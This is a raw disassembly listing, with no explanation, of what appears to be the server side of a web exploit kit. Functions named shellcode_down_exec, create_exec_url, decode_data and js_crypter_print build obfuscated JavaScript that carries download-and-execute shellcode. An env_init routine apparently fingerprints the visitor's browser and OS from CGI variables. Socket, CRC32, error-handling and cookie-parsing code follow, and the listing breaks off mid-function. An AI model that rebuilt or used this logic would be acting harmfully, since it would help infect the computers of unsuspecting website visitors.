movzx  eax,WORD PTR ds:0x8055fa2
push   eax
movzx  eax,BYTE PTR ds:0x8055fa1
push   eax
movzx  eax,BYTE PTR ds:0x8055fa0
push   eax
push   DWORD PTR [ebp-0x2c]
push   DWORD PTR ds:0x8055fc0
mov    eax,DWORD PTR [ebp-0x54]
push   DWORD PTR [eax+0x4]
push   0x804e020
push   edi
call   8048edc <sprintf@plt>
add    esp,0x28
push   0x804e037
push   edi
call   8048c1c <popen@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     8049d02 <main+0x586>
test   edi,edi
je     804a02a <main+0x8ae>
lea    ebx,[ebp-0x45]
jmp    8049ccc <main+0x550>
push   DWORD PTR ds:0x8055920
push   0x1
push   0x1
push   ebx
call   8048f0c <fwrite@plt>
add    esp,0x10
push   esi
push   0x1
push   0x1
push   ebx
call   8048e2c <fread@plt>
add    esp,0x10
dec    eax
je     8049cb9 <main+0x53d>
sub    esp,0xc
push   DWORD PTR ds:0x8055920
call   8048d2c <fflush@plt>
add    esp,0x10
test   edi,edi
je     804a074 <main+0x8f8>
sub    esp,0xc
push   esi
call   8048c7c <pclose@plt>
add    esp,0x10
test   edi,edi
je     8049abd <main+0x341>
sub    esp,0xc
push   edi
call   8048f8c <free@plt>
jmp    8049aba <main+0x33e>
test   dl,dl
mov    ebx,0x8052380
mov    ecx,0x1f3f
mov    esi,0x41670f
mov    eax,0x805594e
mov    DWORD PTR [ebp-0x3c],0xca
js     8049f26 <main+0x7aa>
push   eax
push   esi
push   ecx
push   ebx
call   804d534 <decode_data>
push   0x0
push   DWORD PTR [ebp-0x2c]
push   0x2
push   0x8055fa0
call   804d120 <create_exec_url>
add    esp,0x20
push   0x0
push   DWORD PTR [ebp-0x2c]
push   0x8
push   0x8055fa0
push   0x80000000
push   0x0
mov    esi,eax
lea    eax,[ebp-0x3c]
push   eax
push   0x8054fc0
call   804d194 <shellcode_down_exec>
add    esp,0x1c
push   eax
push   0x804e039
push   ebx
mov    edi,eax
call   804d754 <strreplace>
add    esp,0xc
push   esi
push   0x804df8e
push   eax
mov    ebx,eax
call   804d754 <strreplace>
mov    DWORD PTR [ebp-0x58],eax
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
pop    eax
pop    edx
push   0x0
push   0x804e047
call   804d228 <print_headers>
mov    eax,DWORD PTR [ebp-0x54]
push   DWORD PTR [eax+0x4]
push   DWORD PTR [ebp-0x24]
push   DWORD PTR [ebp-0x2c]
push   DWORD PTR [ebp-0x58]
call   80495e8 <replace_env>
add    esp,0x18
push   0x0
push   eax
mov    ebx,eax
call   804bd34 <js_crypter_print>
pop    eax
push   DWORD PTR [ebp-0x58]
call   8048f8c <free@plt>
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
pop    eax
push   edi
jmp    8049d0e <main+0x592>
push   0x805594d
push   0x6b7cba
push   0x6db
push   0x8051ca0
call   804d534 <decode_data>
push   0x0
push   DWORD PTR [ebp-0x2c]
push   0x6
push   0x8055fa0
push   0x80000000
push   0x0
lea    eax,[ebp-0x40]
push   eax
push   0x8054fc0
mov    DWORD PTR [ebp-0x40],0xca
call   804d194 <shellcode_down_exec>
add    esp,0x2c
push   eax
push   0x804e039
push   0x8051ca0
call   804d754 <strreplace>
mov    edx,DWORD PTR [ebp-0x54]
mov    ebx,eax
mov    al,BYTE PTR [edx]
add    esp,0x10
test   al,al
mov    edi,0xb
js     8049f84 <main+0x808>
cmp    BYTE PTR ds:0x8055fa1,0x2
je     8049fd1 <main+0x855>
test   al,al
js     8049fb9 <main+0x83d>
push   0x805594a
push   0x2f57fa
push   0x297
push   0x8050c20
call   804d534 <decode_data>
add    esp,0xc
push   0x8050c20
push   0x804e051
push   ebx
call   804d754 <strreplace>
mov    esi,eax
mov    edi,0xb
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
add    esp,0x10
push   0x0
mov    edx,edi
push   DWORD PTR [ebp-0x2c]
movzx  eax,dl
push   eax
push   0x8055fa0
push   0x80000000
push   0x0
lea    eax,[ebp-0x40]
push   eax
push   0x8054fc0
mov    DWORD PTR [ebp-0x40],0xca
call   804d194 <shellcode_down_exec>
add    esp,0x1c
push   eax
push   0x804e039
push   esi
call   804d754 <strreplace>
mov    ebx,eax
mov    DWORD PTR [esp],esi
call   8048f8c <free@plt>
mov    edx,DWORD PTR [ebp-0x54]
push   DWORD PTR [edx+0x4]
push   DWORD PTR [ebp-0x24]
push   DWORD PTR [ebp-0x2c]
push   ebx
call   80495e8 <replace_env>
add    esp,0x18
push   0x1
push   eax
mov    esi,eax
call   804bd34 <js_crypter_print>
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
mov    DWORD PTR [esp],esi
call   8048f8c <free@plt>
jmp    8049aba <main+0x33e>
mov    ebx,0x80542c0
mov    cx,0xce2
mov    esi,0xa709e2
mov    eax,0x805594f
jmp    8049d3b <main+0x5bf>
push   0x8055948
push   0x509110
push   0x59f
push   0x8050340
call   804d534 <decode_data>
push   0x0
push   DWORD PTR [ebp-0x2c]
push   0x5
push   0x8055fa0
call   804d120 <create_exec_url>
add    esp,0x1c
push   eax
push   0x804df8e
push   0x8050340
call   804d754 <strreplace>
add    esp,0xc
push   eax
jmp    8049a9b <main+0x31f>
push   eax
push   0x804e05d
push   0x804e063
push   ebx
call   804d754 <strreplace>
add    esp,0x10
test   ebx,ebx
mov    esi,eax
je     8049faa <main+0x82e>
sub    esp,0xc
push   ebx
call   8048f8c <free@plt>
add    esp,0x10
mov    edx,DWORD PTR [ebp-0x54]
mov    al,BYTE PTR [edx]
test   al,al
mov    ebx,esi
jns    8049e5a <main+0x6de>
push   esi
push   0x804eef9
push   0x804e051
push   ebx
call   804d754 <strreplace>
mov    esi,eax
jmp    8049eaa <main+0x72e>
cmp    WORD PTR ds:0x8055fa2,0x5e0
jbe    8049e67 <main+0x6eb>
push   0x805594b
push   0xa2ec9d
push   0xa49
push   0x8050ec0
call   804d534 <decode_data>
add    esp,0xc
push   0x8050ec0
push   0x804e051
push   ebx
call   804d754 <strreplace>
mov    esi,eax
mov    edi,0x1
jmp    8049ea2 <main+0x726>
sub    esp,0xc
push   0x804e160
call   8048cdc <puts@plt>
jmp    8049aba <main+0x33e>
push   eax
push   0x2
push   0x0
push   esi
call   8048dac <fseek@plt>
mov    DWORD PTR [esp],esi
call   8048e7c <ftell@plt>
add    esp,0xc
push   0x0
push   0x0
mov    ebx,eax
push   esi
call   8048dac <fseek@plt>
add    esp,0x10
test   ebx,ebx
jle    804a064 <main+0x8e8>
sub    esp,0x8
push   ebx
push   0x804e19c
call   8048c2c <printf@plt>
add    esp,0x10
test   ebx,ebx
jne    8049cb4 <main+0x538>
test   edi,edi
jne    8049cb4 <main+0x538>
sub    esp,0xc
push   esi
call   8048e9c <fclose@plt>
jmp    8049cff <main+0x583>
sub    esp,0x8
push   0x804e068
mov    edx,DWORD PTR [ebp-0x54]
push   DWORD PTR [edx+0x4]
call   8048e4c <fopen@plt>
jmp    8049ca3 <main+0x527>
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x78
push   0x0
push   0x1
push   0x1
call   8048d0c <socket@plt>
mov    ds:0x805508c,eax
add    esp,0x10
inc    eax
je     804a100 <client_connect+0x64>
push   ecx
push   0x6a
push   0x0
lea    ebx,[ebp-0x78]
push   ebx
call   8048e5c <memset@plt>
mov    BYTE PTR [ebp-0x77],0x1
pop    eax
pop    edx
push   0x804e1e3
lea    eax,[ebp-0x76]
push   eax
call   8048c0c <strcpy@plt>
add    esp,0xc
push   0x6a
push   ebx
push   DWORD PTR ds:0x805508c
call   8048c6c <connect@plt>
add    esp,0x10
inc    eax
mov    edx,0x1
je     804a114 <client_connect+0x78>
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
mov    esi,esi
sub    esp,0xc
push   0x1
call   804a860 <seterror>
xor    edx,edx
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
nop
sub    esp,0xc
push   DWORD PTR ds:0x805508c
call   8048f7c <close@plt>
mov    DWORD PTR [esp],0x2
jmp    804a105 <client_connect+0x69>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    ebx,DWORD PTR [ebp+0xc]
xor    esi,esi
test   ebx,ebx
mov    edi,DWORD PTR [ebp+0x8]
jne    804a15c <client_send_data+0x30>
push   0x0
push   edi
push   0x804e1f7
push   0x6
call   804a860 <seterror>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
push   0x0
push   ebx
push   edi
push   DWORD PTR ds:0x805508c
call   8048d3c <send@plt>
add    esp,0x10
test   eax,eax
jle    804a182 <client_send_data+0x56>
add    esi,eax
sub    ebx,eax
jne    804a15c <client_send_data+0x30>
test   eax,eax
jle    804a182 <client_send_data+0x56>
test   ebx,ebx
mov    eax,esi
je     804a152 <client_send_data+0x26>
sub    esp,0xc
push   0x3
jmp    804a14b <client_send_data+0x1f>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
push   eax
mov    ebx,DWORD PTR [ebp+0x8]
test   ebx,ebx
je     804a1ee <client_send_request+0x62>
cmp    DWORD PTR ds:0x805508c,0xffffffff
je     804a1dc <client_send_request+0x50>
push   0x0
push   0x20
push   ebx
push   DWORD PTR ds:0x805508c
call   8048d3c <send@plt>
add    esp,0x10
test   eax,eax
jle    804a1fa <client_send_request+0x6e>
cmp    eax,0x20
mov    edx,0x1
je     804a1d3 <client_send_request+0x47>
push   0x20
push   eax
push   0x804e210
push   0x7
call   804a860 <seterror>
xor    edx,edx
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
mov    esi,esi
call   804a09c <client_connect>
xor    edx,edx
test   eax,eax
jne    804a1a1 <client_send_request+0x15>
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebx
push   0x0
push   0x804e225
push   0x6
jmp    804a1cc <client_send_request+0x40>
sub    esp,0xc
push   0x3
jmp    804a1cc <client_send_request+0x40>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x41c
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x41c],0x0
xor    ebx,ebx
mov    DWORD PTR [eax],0x0
jmp    804a264 <client_recv_reply+0x60>
nop
lea    edi,[ebx+esi*1]
sub    esp,0x8
lea    eax,[edi+0x1]
push   eax
push   DWORD PTR [ebp-0x41c]
call   804da74 <xrealloc>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x41c],eax
je     804a2b4 <client_recv_reply+0xb0>
add    ebx,eax
push   eax
push   esi
lea    eax,[ebp-0x418]
push   eax
push   ebx
call   8048ccc <memcpy@plt>
mov    BYTE PTR [ebx+esi*1],0x0
add    esp,0x10
mov    ebx,edi
push   0x0
push   0x400
lea    eax,[ebp-0x418]
push   eax
push   DWORD PTR ds:0x805508c
call   8048c5c <recv@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
jg     804a228 <client_recv_reply+0x24>
jne    804a28c <client_recv_reply+0x88>
test   ebx,ebx
jne    804a2be <client_recv_reply+0xba>
sub    esp,0xc
push   0x3
call   804a860 <seterror>
mov    eax,DWORD PTR [ebp-0x41c]
add    esp,0x10
test   eax,eax
je     804a2b4 <client_recv_reply+0xb0>
sub    esp,0xc
push   DWORD PTR [ebp-0x41c]
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [eax],ebx
mov    eax,DWORD PTR [ebp-0x41c]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,ds:0x805508c
test   eax,eax
jle    804a2ef <client_close+0x1b>
sub    esp,0xc
push   eax
call   8048f7c <close@plt>
add    esp,0x10
mov    DWORD PTR ds:0x805508c,0xffffffff
leave  
ret    
nop
push   ebp
mov    ebp,esp
mov    eax,DWORD PTR [ebp+0x8]
mov    dl,BYTE PTR [ebp+0xc]
xor    edx,eax
movzx  edx,dl
shr    eax,0x8
xor    eax,DWORD PTR [edx*4+0x80550a0]
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
push   esi
mov    esi,DWORD PTR [ebp+0x8]
xor    eax,eax
test   esi,esi
push   ebx
mov    ebx,DWORD PTR [ebp+0xc]
je     804a350 <Crc32Str+0x38>
test   ebx,ebx
je     804a358 <Crc32Str+0x40>
mov    edx,0xffffffff
xor    edi,edi
jmp    804a348 <Crc32Str+0x30>
nop
movzx  eax,BYTE PTR [esi+edi*1]
push   eax
push   edx
call   804a2fc <Crc32Add>
pop    edx
pop    ecx
mov    edx,eax
inc    edi
cmp    edi,ebx
jb     804a338 <Crc32Str+0x20>
mov    eax,edx
not    eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
cld    
mov    ecx,0xffffffff
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ebx,[ecx-0x1]
jmp    804a32e <Crc32Str+0x16>
nop
nop
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x68
mov    ebx,DWORD PTR [ebp+0x8]
cld    
xor    eax,eax
mov    ecx,0x10
mov    edi,ebx
mov    DWORD PTR [ebp-0x3c],0x0
rep stos DWORD PTR es:[edi],eax
push   0x804e23d
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x24],eax
mov    DWORD PTR [esp],0x804e24d
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x10],eax
mov    DWORD PTR [esp],0x804e25a
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x14],eax
mov    DWORD PTR [esp],0x804e269
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x18],eax
mov    DWORD PTR [esp],0x804e275
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x1c],eax
mov    DWORD PTR [esp],0x804e281
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x28],eax
mov    DWORD PTR [esp],0x804e28d
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x20],eax
mov    DWORD PTR [esp],0x804e299
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x2c],eax
mov    DWORD PTR [esp],0x804e2a5
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x30],eax
mov    DWORD PTR [esp],0x804e2b1
call   8048c9c <getenv@plt>
mov    DWORD PTR [ebx+0x34],eax
mov    DWORD PTR [esp],0x804e2be
call   8048c9c <getenv@plt>
mov    esi,eax
add    esp,0x10
xor    eax,eax
test   esi,esi
je     804a442 <env_init+0xd6>
sub    esp,0xc
push   esi
call   8048c8c <atol@plt>
add    esp,0x10
sub    esp,0xc
mov    DWORD PTR [ebx+0x38],eax
push   0x804e2cd
call   8048c9c <getenv@plt>
mov    esi,eax
add    esp,0x10
test   esi,esi
mov    eax,0x50
je     804a46c <env_init+0x100>
sub    esp,0xc
push   esi
call   8048f2c <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebx+0x3c],eax
mov    eax,DWORD PTR [ebx+0x20]
test   eax,eax
je     804a648 <env_init+0x2dc>
mov    eax,DWORD PTR [ebx+0x1c]
test   eax,eax
je     804a488 <env_init+0x11c>
mov    eax,DWORD PTR [ebx+0x28]
test   eax,eax
jne    804a4bc <env_init+0x150>
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
call   804d700 <xstrdup>
mov    DWORD PTR [ebx+0x30],eax
mov    DWORD PTR [esp],0x0
call   8048eac <time@plt>
mov    DWORD PTR [esp],eax
call   8048e8c <srand@plt>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,0x1
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebx+0x20]
test   eax,eax
je     804a488 <env_init+0x11c>
mov    edi,DWORD PTR [ebx+0x30]
test   edi,edi
je     804a488 <env_init+0x11c>
mov    eax,DWORD PTR [ebx+0x34]
test   eax,eax
mov    DWORD PTR [ebx+0x8],0x1
jne    804a6d8 <env_init+0x36c>
mov    eax,DWORD PTR [ebx+0x24]
xor    esi,esi
test   eax,eax
je     804a536 <env_init+0x1ca>
xor    edi,edi
nop
sub    esp,0x8
lea    eax,[edi+0x8055544]
push   eax
push   DWORD PTR [ebx+0x24]
call   804d2c4 <stristr>
add    esp,0x10
test   eax,eax
jne    804a6ed <env_init+0x381>
sub    esp,0x8
lea    eax,[edi+0x8055554]
push   eax
push   DWORD PTR [ebx+0x24]
call   804d2c4 <stristr>
add    esp,0x10
test   eax,eax
jne    804a6ed <env_init+0x381>
inc    esi
add    edi,0x34
cmp    esi,0x6
ja     804a6f5 <env_init+0x389>
mov    eax,DWORD PTR [ebx+0x24]
test   eax,eax
jne    804a4e8 <env_init+0x17c>
cmp    BYTE PTR [ebx],0x0
jne    804a53e <env_init+0x1d2>
mov    BYTE PTR [ebx],0x8
xor    esi,esi
test   eax,eax
je     804a57d <env_init+0x211>
lea    eax,[esi+esi*8]
lea    edi,[eax*4+0x0]
sub    esp,0x8
lea    ecx,[edi+0x80554a4]
push   ecx
push   DWORD PTR [ebx+0x24]
mov    DWORD PTR [ebp-0x40],ecx
call   804d2c4 <stristr>
add    esp,0x10
test   eax,eax
mov    edx,eax
jne    804a707 <env_init+0x39b>
inc    esi
cmp    esi,0x3
ja     804a57d <env_init+0x211>
mov    ecx,DWORD PTR [ebx+0x24]
test   ecx,ecx
jne    804a544 <env_init+0x1d8>
cmp    BYTE PTR [ebx+0x1],0x0
jne    804a58d <env_init+0x221>
mov    BYTE PTR [ebx+0x1],0x5
mov    WORD PTR [ebx+0x2],0x0
sub    esp,0xc
push   DWORD PTR [ebx+0x28]
call   8048e3c <strdup@plt>
sub    esp,0x8
push   0x3f
push   eax
mov    esi,eax
call   8048d4c <strrchr@plt>
add    esp,0x20
test   eax,eax
je     804a5af <env_init+0x243>
mov    BYTE PTR [eax],0x0
xor    edx,edx
mov    al,dl
cld    
mov    edi,esi
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    DWORD PTR [ebp-0x5c],ecx
mov    edi,DWORD PTR [ebx+0x1c]
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    eax,DWORD PTR [ebp-0x5c]
sub    esp,0xc
lea    ecx,[ecx+eax*1+0x1e]
push   ecx
call   8048cec <malloc@plt>
mov    DWORD PTR [ebx+0xc],eax
mov    eax,DWORD PTR [ebx+0x3c]
add    esp,0x10
cmp    eax,0x50
je     804a600 <env_init+0x294>
sub    esp,0x8
push   eax
push   0x804e2d9
call   804d62c <ntoa>
mov    DWORD PTR [ebp-0x3c],eax
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x3c]
sub    esp,0xc
test   eax,eax
push   esi
je     804a6fd <env_init+0x391>
push   eax
push   DWORD PTR [ebx+0x1c]
push   0x804e2dd
push   DWORD PTR [ebx+0xc]
call   8048edc <sprintf@plt>
add    esp,0x14
push   esi
call   8048f8c <free@plt>
pop    eax
pop    edx
push   0x0
mov    eax,DWORD PTR [ebx+0x34]
test   eax,eax
jne    804a639 <env_init+0x2cd>
mov    eax,0x804e2eb
push   eax
call   804a318 <Crc32Str>
mov    DWORD PTR [ebx+0x4],eax
jmp    804a498 <env_init+0x12c>
nop
sub    esp,0xc
push   0x804e2ee
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x14],eax
mov    DWORD PTR [esp],0x804e2f2
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x20],eax
mov    DWORD PTR [esp],0x804e300
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x1c],eax
mov    DWORD PTR [esp],0x804e30b
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x28],eax
mov    DWORD PTR [esp],0x804e330
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x24],eax
mov    DWORD PTR [esp],0x804e368
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x24],eax
mov    DWORD PTR [esp],0x804e30b
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x30],eax
mov    DWORD PTR [esp],0x804e322
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebx+0x10],eax
mov    DWORD PTR [esp],0x804e3a0
call   8048e3c <strdup@plt>
add    esp,0x10
mov    DWORD PTR [ebx+0x34],eax
jmp    804a47a <env_init+0x10e>
cmp    BYTE PTR [eax],0x0
jne    804a4dc <env_init+0x170>
mov    DWORD PTR [ebx+0x34],0x0
jmp    804a4dc <env_init+0x170>
mov    eax,DWORD PTR [edi+0x8055540]
mov    BYTE PTR [ebx],al
mov    eax,DWORD PTR [ebx+0x24]
jmp    804a536 <env_init+0x1ca>
mov    eax,0x804e01f
jmp    804a60f <env_init+0x2a3>
mov    eax,DWORD PTR [edi+0x80554a0]
mov    BYTE PTR [ebx+0x1],al
cld    
xor    eax,eax
mov    edi,DWORD PTR [ebp-0x40]
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
sub    esp,0xc
lea    ecx,[ecx+edx*1-0x1]
push   ecx
call   8048e3c <strdup@plt>
mov    DWORD PTR [ebp-0x44],eax
mov    cl,BYTE PTR [eax]
add    esp,0x10
test   cl,cl
mov    edx,eax
je     804a7e8 <env_init+0x47c>
lea    eax,[ecx-0x41]
cmp    al,0x19
mov    esi,ecx
jbe    804a774 <env_init+0x408>
lea    eax,[ecx-0x61]
cmp    al,0x19
jbe    804a774 <env_init+0x408>
lea    eax,[ecx-0x30]
cmp    al,0x9
jbe    804a774 <env_init+0x408>
inc    edx
movzx  esi,BYTE PTR [edx]
mov    eax,esi
test   al,al
je     804a774 <env_init+0x408>
lea    eax,[esi-0x41]
cmp    al,0x19
jbe    804a774 <env_init+0x408>
lea    eax,[esi-0x61]
cmp    al,0x19
jbe    804a774 <env_init+0x408>
lea    eax,[esi-0x30]
cmp    al,0x9
ja     804a755 <env_init+0x3e9>
mov    DWORD PTR [ebp-0x48],edx
lea    eax,[esi-0x41]
cmp    al,0x19
ja     804a7a8 <env_init+0x43c>
mov    eax,esi
cmp    al,0x2e
lea    edi,[edx+0x1]
je     804a790 <env_init+0x424>
mov    edx,edi
movzx  esi,BYTE PTR [edi]
jmp    804a777 <env_init+0x40b>
mov    esi,esi
sub    esp,0x8
lea    edi,[edx+0x1]
push   edi
push   edx
call   8048c0c <strcpy@plt>
add    esp,0x10
mov    edx,edi
movzx  esi,BYTE PTR [edi]
jmp    804a777 <env_init+0x40b>
nop
lea    eax,[esi-0x61]
cmp    al,0x19
jbe    804a77e <env_init+0x412>
lea    eax,[esi-0x30]
cmp    al,0x9
jbe    804a77e <env_init+0x412>
mov    ecx,esi
cmp    cl,0x2e
je     804a790 <env_init+0x424>
sub    esp,0xc
push   DWORD PTR [ebp-0x48]
call   8048f2c <atoi@plt>
add    esp,0x10
cmp    BYTE PTR [ebx+0x1],0x2
mov    WORD PTR [ebx+0x2],ax
je     804a7ed <env_init+0x481>
sub    esp,0xc
push   DWORD PTR [ebp-0x44]
call   8048f8c <free@plt>
add    esp,0x10
jmp    804a57d <env_init+0x211>
movzx  esi,BYTE PTR [eax]
jmp    804a774 <env_init+0x408>
movzx  eax,ax
push   esi
push   eax
push   0x804e32a
lea    edi,[ebp-0x38]
push   edi
call   8048edc <sprintf@plt>
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    esi,[ecx-0x1]
add    esp,0x10
cmp    esi,0x3
jg     804a7d5 <env_init+0x469>
mov    dx,WORD PTR [ebx+0x2]
movzx  eax,dx
lea    eax,[eax+eax*4]
inc    esi
shl    eax,1
cmp    esi,0x3
mov    edx,eax
jle    804a81b <env_init+0x4af>
mov    WORD PTR [ebx+0x2],ax
jmp    804a7d5 <env_init+0x469>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
push   eax
mov    ebx,DWORD PTR [ebp+0x8]
mov    eax,DWORD PTR [ebx+0xc]
test   eax,eax
jne    804a848 <env_free+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    DWORD PTR [ebx+0xc],0x0
add    esp,0x10
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x1c
mov    eax,ds:0x8055954
mov    esi,DWORD PTR [ebp+0x8]
test   eax,eax
mov    DWORD PTR ds:0x8055958,esi
jne    804a8b4 <seterror+0x54>
lea    eax,[esi-0x1]
cmp    eax,0x24
ja     804a8a9 <seterror+0x49>
mov    eax,DWORD PTR [ebp+0xc]
test   eax,eax
mov    DWORD PTR [ebp-0x1c],eax
je     804a892 <seterror+0x32>
cmp    BYTE PTR [eax],0x0
jne    804a8cc <seterror+0x6c>
sub    esp,0xc
push   DWORD PTR [esi*4+0x80556c0]
call   8048e3c <strdup@plt>
mov    ds:0x8055954,eax
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
add    esp,0x10
mov    DWORD PTR ds:0x8055954,0x0
jmp    804a87b <seterror+0x1b>
cld    
mov    edi,eax
mov    ecx,0xffffffff
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
mov    edx,DWORD PTR [esi*4+0x80556c0]
not    ecx
mov    edi,edx
mov    DWORD PTR [ebp-0x20],ecx
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    eax,DWORD PTR [ebp-0x20]
lea    ecx,[ecx+eax*1-0x2]
sub    esp,0xc
push   ecx
call   804d878 <xmalloc>
add    esp,0xc
push   DWORD PTR [ebp-0x1c]
push   DWORD PTR [esi*4+0x80556c0]
mov    ebx,eax
push   eax
call   8048edc <sprintf@plt>
mov    edi,ebx
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
add    ecx,0x27ff
mov    DWORD PTR [esp],ecx
call   804d878 <xmalloc>
add    esp,0xc
lea    edx,[ebp+0x10]
push   edx
push   ebx
push   eax
mov    ds:0x8055954,eax
call   8048c3c <vsprintf@plt>
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
add    esp,0x10
jmp    804a8a9 <seterror+0x49>
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,ds:0x8055954
test   eax,eax
mov    DWORD PTR ds:0x8055958,0x0
jne    804a970 <clearerror+0x1c>
leave  
ret    
nop
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    DWORD PTR ds:0x8055954,0x0
add    esp,0x10
leave  
ret    
mov    eax,ds:0x8055954
push   ebp
test   eax,eax
mov    ebp,esp
jne    804a9a0 <geterror+0x18>
mov    eax,ds:0x8055958
mov    eax,DWORD PTR [eax*4+0x80556c0]
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
mov    eax,ds:0x8055958
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x10
call   804a988 <geterror>
push   eax
push   0x804e780
call   8048c2c <printf@plt>
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0x8]
test   eax,eax
mov    edx,DWORD PTR [ebp+0xc]
je     804aad1 <cookie_parse+0x109>
mov    eax,DWORD PTR [ebp+0x8]
test   edx,edx
mov    DWORD PTR [eax],0x0
mov    DWORD PTR [eax+0x4],0x0
mov    eax,0x1
je     804aa85 <cookie_parse+0xbd>
mov    ebx,edx
jmp    804aa05 <cookie_parse+0x3d>
cmp    BYTE PTR [ebx],0x0
je     804aa80 <cookie_parse+0xb8>
sub    esp,0x8
push   0x3b
push   ebx
call   8048f5c <strchr@plt>
add    esp,0x10
test   eax,eax
mov    edi,eax
je     804aa1c <cookie_parse+0x54>
mov    BYTE PTR [eax],0x0
push   eax
push   0x0
push   0x3d
push   ebx
call   804db44 <strsplit>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804aa6b <cookie_parse+0xa3>
push   eax
push   0x1
push   0x3d
push   ebx
call   804db44 <strsplit>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x10],eax
je     804aa4a <cookie_parse+0x82>
cmp    BYTE PTR [eax],0x0
jne    804aa90 <cookie_parse+0xc8>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
mov    eax,DWORD PTR [ebp-0x10]
add    esp,0x10
test   eax,eax
je     804aa6b <cookie_parse+0xa3>
sub    esp,0xc
push   DWORD PTR [ebp-0x10]
call   8048f8c <free@plt>
add    esp,0x10
test   edi,edi
lea    ebx,[edi+0x1]
je     804aa80 <cookie_parse+0xb8>
cmp    BYTE PTR [edi+0x1],0x20
jne    804aa00 <cookie_parse+0x38>
lea    ebx,[edi+0x2]
cmp    BYTE PTR [ebx],0x0
jne    804aa05 <cookie_parse+0x3d>
mov    eax,0x1
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
mov    edx,DWORD PTR [ebp+0x8]
mov    eax,DWORD PTR [edx+0x4]
sub    esp,0x8
lea    eax,[eax*8+0x8]
push   eax
push   DWORD PTR [edx]
